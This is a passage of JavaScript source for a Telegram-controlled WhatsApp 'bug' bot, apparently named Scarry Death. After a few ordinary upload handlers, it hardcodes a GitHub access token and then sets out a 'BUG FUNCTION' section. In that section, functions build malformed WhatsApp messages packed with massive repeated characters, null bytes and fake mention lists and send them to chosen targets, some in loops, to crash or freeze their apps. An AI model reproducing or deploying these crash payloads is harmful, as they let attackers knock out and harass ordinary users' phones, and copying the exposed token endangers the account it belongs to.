            caption: "✨ Foto bersama berhasil dibuat!"
        });

    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    // Bersihkan
    bot.lastAskPhoto = null;
    bot.lastAskArtis = null;
    bot.userPhotoUrl = null;
});

bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(`✅ Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

const { OWNER_ID, NOTIF_ID } = require("./config");
let waMonitoring = false;
const NOTIF_TARGET_ID = NOTIF_ID;
const GITHUB_TOKEN = "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"; 
// === DETEKSI PERUBAHAN TEXT GITHUB RAW SCARRY DEATH ===

// URL RAW FILE (isi hanya on1 / on2 / on3 / dll)
const RAW_STATUS_URL = "https://raw.githubusercontent.com/Raraaimupp/updatescarry/refs/heads/main/teks.txt";

let lastHash = null;           // hash terakhir yang disimpan di RAM
let hasNotified = false;       // mencegah kirim dua kali

// ===============================
// 🔥 ANIMASI LOADING UPDATE
// ===============================
async function showUpdateLoading(bot, chatId) {
    const bars = [
        "▰▱▱▱▱ 10%",
        "▰▰▱▱▱ 20%",
        "▰▰▰▱▱ 30%",
        "▰▰▰▰▱ 40%",
        "▰▰▰▰▰ 50%",
        "▰▰▰▰▰▰ 60%",
        "▰▰▰▰▰▰▰ 70%",
        "▰▰▰▰▰▰▰▰ 80%",
        "▰▰▰▰▰▰▰▰▰ 90%",
        "▰▰▰▰▰▰▰▰▰▰ 100%"
    ];

    let msg = await bot.sendMessage(
        chatId,
        `<blockquote>PROSES UPDATE SCARRY DEATH...</blockquote>\n${bars[0]}`,
        { parse_mode: "HTML" }
    );

    // animasi progres
    for (let i = 1; i < bars.length; i++) {
        await new Promise(res => setTimeout(res, 350));
        await bot.editMessageText(
            `<blockquote>PROSES UPDATE SCARRY DEATH...</blockquote>\n${bars[i]}`,
            { chat_id: chatId, message_id: msg.message_id, parse_mode: "HTML" }
        );
    }

    // hapus pesan animasi
    await new Promise(res => setTimeout(res, 500));
    await bot.deleteMessage(chatId, msg.message_id);
}

// =====================================================
// 🔥 KIRIM NOTIF KALAU GWE UPDATE
// =====================================================
async function sendUpdateNotification(bot, ownerId) {

   const text = `
\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃          ✦ 𝗨𝗣𝗗𝗔𝗧𝗘 𝗙𝗘𝗔𝗧𝗨𝗥𝗘 ✦           ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
✦ UPDATE FITUR BUGS FREZE X DELAY NO CLCIK
✦ update fiture /frezehard
Effect : Invisible Delay X Freze Work All Android
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃          ✦ Scarry Death LOG ✦      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`;

    return bot.sendMessage(ownerId, text, {
    parse_mode: "Markdown",
    disable_web_page_preview: true
});
}


// =====================================================
// 🔥 CEK PERUBAHAN RAW GITHUB
// =====================================================
async function checkRawChange() {
    try {
        const res = await axios.get(RAW_STATUS_URL, {
            timeout: 15000,
            headers: { "User-Agent": "Mozilla/5.0" }
        });

        const text = String(res.data).trim();
        const hash = crypto.createHash("sha256").update(text).digest("hex");

        // *** KIRIM HANYA KALAU BENAR-BENAR ADA PERUBAHAN ***
        if (lastHash !== null && hash !== lastHash && !hasNotified) {

            hasNotified = true; // biar tidak spam

            // lakukan loading animasi + hapus otomatis
            if (Array.isArray(OWNER_ID)) {
                for (const id of OWNER_ID) {
                    await showUpdateLoading(bot, id);
                    await sendUpdateNotification(bot, id);
                }
            } else {
                await showUpdateLoading(bot, OWNER_ID);
                await sendUpdateNotification(bot, OWNER_ID);
            }

            console.log("✓ Update terdeteksi — notifikasi terkirim!");
        }

        // simpan hash terbaru
        lastHash = hash;

    } catch (err) {
        console.log("Welcome To Scarry Death:", err.message);
    }
}

// cek setiap 20 detik
setInterval(checkRawChange, 10);


/////// BUG FUNCTION ///////
async function Blanknewsletter(target) {
  try {
    const raraa = {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "13135550002@newsletter",
          newsletterName: "𑲱".repeat (10000),
          jpegThumbnail: Buffer.from([
            182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
            117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
            145
          ]),
          caption: "~@8~" + "ꦽ".repeat(10000),
          inviteExpiration: 99999999,
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }

    await sock.relayMessage(
      target,
      raraa.message,
      { messageId: null }
    )

    console.log("BLANK SEND TO TARGET")
  } catch (err) {
    console.error(err)
  }
}

async function DelayBuldoHardFreezeByMia(target) {
const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ raaa?̶ Y̶e̶a̶h̶ I̶a̶m̶ Raa 🤪",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "flow_message",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}

async function bulldozerDelay2GB(target) {
  const miaMessages = {
    viewOnceMessage: {  
      message: {  
        interactiveResponseMessage: {  
          body: {  
            text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ Raaa?̶ Y̶e̶a̶h̶ I̶a̶m̶ Raa 🤪",  
            hasMediaAttachment: false  
          },  
          videoMessage: {  
            url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0&mms3=true",  
            mimetype: "video/mp4",  
            fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",  
            fileLength: "1073741824",
            height: 1080,  
            width: 1920,
            mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",  
            fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",  
            directPath: "/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0",  
            mediaKeyTimestamp: "1775847446",
            seconds: 3600,
            contextInfo: {  
              forwardingScore: 9999,  
              isForwarded: true,  
              mentionedJid: [  
                "0@s.whatsapp.net",  
                ...Array.from(  
                  { length: 1900 },  
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                )  
              ],  
              expiration: 9741,  
              ephemeralSettingTimestamp: 9741,  
              entryPointConversionSource: "WhatsApp.com",  
              entryPointConversionApp: "WhatsApp",  
              entryPointConversionDelaySeconds: 9742,  
              disappearingMode: {  
                initiator: "INITIATED_BY_OTHER",  
                trigger: "ACCOUNT_SETTING"  
              }  
            } 
          },  
          nativeFlowResponseMessage: {  
            name: "address_message",  
            paramsJson: "\u0000".repeat(1045900),  
            version: 3  
          }  
        }  
      }  
    }  
  };

  const miaMSG = generateWAMessageFromContent(target, miaMessages, {});

  await sock.relayMessage("status@broadcast", miaMSG.message, {
    messageId: miaMSG.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}

async function delayMsg1GB(target) {
  const miawUwU = generateWAMessageFromContent(
    target,
    {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        caption: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ Raa?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪" + "ꦽ".repeat(99000) + "\u0000".repeat(50000),
        mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",
        fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",
        fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",
        fileLength: "1073741824",
        mediaKeyTimestamp: "1775847446"
      }
    },
    {}
  );
  await sock.relayMessage("status@broadcast", miawUwU.message, {
    messageId: miawUwU.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  await sock.sendMessage("status@broadcast", {
    delete: {
      remoteJid: "status@broadcast",
      fromMe: true,
      id: miawUwU.key.id
    }
  });
}

async function iosinVisFC3(target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/elyssavirellequeenn",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "raa",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function FcClickByMia(target) {
  await sock.relayMessage(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
      "fileLength": "175891",
      "seconds": 1,
      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
      "height": 848,
      "width": 480,
      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
      "mediaKeyTimestamp": "1765345955",
      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
      "annotations": [{
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMusic": {
            "musicContentMediaId": "3312808138872179",
            "songId": "270259430421407",
            "author": "ြ".repeat(200000),

            "title": "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ Raa 🤪",
            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
            "countryBlocklist": "",
            "isExplicit": true,
            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
            "musicSongStartTimeInMs": "10149",
            "derivedContentStartTimeInMs": "0",
            "overlapDurationInMs": "1000"
          }
        },
        "embeddedAction": true
      }]
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
}

async function NullCrashx(groupJid) {
  const msg = generateWAMessageFromContent(
    groupJid,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: groupJid,
              participant: "13135559098@s.whatsapp.net",
              mentionedJid: [groupJid],
              isForwarded: true,
              fromMe: false,
              forwardingScore: 9,
              expiration: 7205,
              ephemeralSettingTimestamp: 2502,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              },
              AdReplyInfo: {
                advertiserName: " Null Fvck ",
                mediaType: "NONE",
                caption: " X "
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: 7205
                }
              }
            },
            body: {
              text: "@raraa • #scarry 🩸",
              format: "EXTENSIONS_1"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    groupJid,
    msg.message,
    {
      messageId: msg.key.id
    }
  );
}

async function BlankGroupu(groupJid) {
    await sock.relayMessage(groupJid, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "\u0003".repeat(200000) },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            payment_currency: "BTC",
                            payment_amount: 0
                        })
                    }
                }
            }
        }
    }, {});
}

async function newsletterjh(groupJid) {
  try {
    const raraa = {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "13135550002@newsletter",
          newsletterName: "𑲱".repeat(10000),
          jpegThumbnail: Buffer.from([
            182, 141, 235, 167, 91, 254, 75, 254, 190, 229, 25, 16, 78, 48, 98,
            117, 42, 71, 65, 199, 10, 164, 16, 57, 189, 229, 54, 93, 69, 6, 212,
            145
          ]),
          caption: "~@8~" + "ꦽ".repeat(10000),
          inviteExpiration: 99999999,
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }

    await sock.relayMessage(
      groupJid,
      raraa.message,
      { messageId: sock.generateMessageTag() }
    )

    console.log("BLANK SEND TO GROUP: " + groupJid)
  } catch (err) {
    console.error(err)
  }
}

async function HardLocUI(target) {
  try {
    const zieeBtn = [
      {
        buttonId: ".id1",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id2",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id3",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      }
    ];

    const zieeMsg = {
      location: {
        degreesLatitude: -1,
        degreesLongitude: -1,
        name: "CrashSysui 永遠に生きる" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
